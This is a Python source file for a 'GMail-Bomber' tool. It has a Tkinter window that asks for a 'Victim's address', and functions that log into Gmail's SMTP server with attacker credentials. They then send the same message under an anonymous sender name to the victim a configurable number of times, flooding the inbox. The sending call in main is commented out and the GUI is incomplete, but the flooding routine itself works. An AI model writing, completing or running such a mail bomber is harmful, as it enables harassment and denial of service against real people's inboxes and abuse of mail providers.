import atexit
import binascii
import smtplib
from email.message import EmailMessage
from options import BomberOptions
from res.icon import runtime_icon
import tkinter as tk
import tempfile
import os

#
# Constants
#

smtp_server = 'smtp.gmail.com'
port = 587

#
# User interface
#

def on_closing(iconfile):
    try:
        os.remove(iconfile.name)
    except Exception:
        pass

def create_gui() -> tk.Tk:
    root = tk.Tk()
   
    root.geometry("400x400")
    root.resizable(0, 0)
    root.title("GMail-Bomber")
    root.configure(background = 'black')
    
    iconfile = tempfile.NamedTemporaryFile(delete = False)
    iconfile.write(binascii.a2b_hex(runtime_icon.iconhexdata))
    atexit.register(lambda file = iconfile: on_closing(runtime_icon.iconhexdata))
    
    root.iconbitmap(iconfile.name)
   
    lbl_victim_address = tk.Label(root, text = 'Victim\'s address: ', bg = 'black', fg = 'white')
    lbl_victim_address.place(x = 10, y = 15)
    
    txt_victim_address = tk.Text(root, bg = 'black', fg = 'white', width = 30, height = 1, insertbackground = 'white')
    txt_victim_address.place(x = 140, y = 15)
    
    return root

#
# Main methods
#

def create_message(options: BomberOptions) -> EmailMessage:
    
    # Create email
    msg = EmailMessage()
    msg['Subject'] = options.email_subject
    msg['From'] = f'{options.attacker_anonymous_name} <{options.attacker_gmail_address}>'
    msg['To'] = options.victim_address
    msg.set_content(options.email_body)
    
    return msg

def server_login(options: BomberOptions) -> smtplib.SMTP:
    
    # Create smtp server
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.ehlo()
    
    # Try to login
    try:
        server.login(options.attacker_gmail_address, options.attacker_gmail_password)
    except smtplib.SMTPAuthenticationError:
        raise ValueError('The password doesn\'t match the email or you don\'t have access enabled by less secure apps on Google')
    
    return server

def send_emails(options: BomberOptions) -> None:
    email_server = server_login(options)
    email_message = create_message(options)
    
    for i in range(options.email_amount):
        email_server.send_message(email_message)
        print(f'Sent email number {i + 1}')
    email_server.quit()
    print('Emails have been sent successfully')

def main() -> None:
    options = BomberOptions()
   
    gui = create_gui()
    gui.mainloop()
   
   #send_emails(options)

if __name__ == '__main__':
    main()
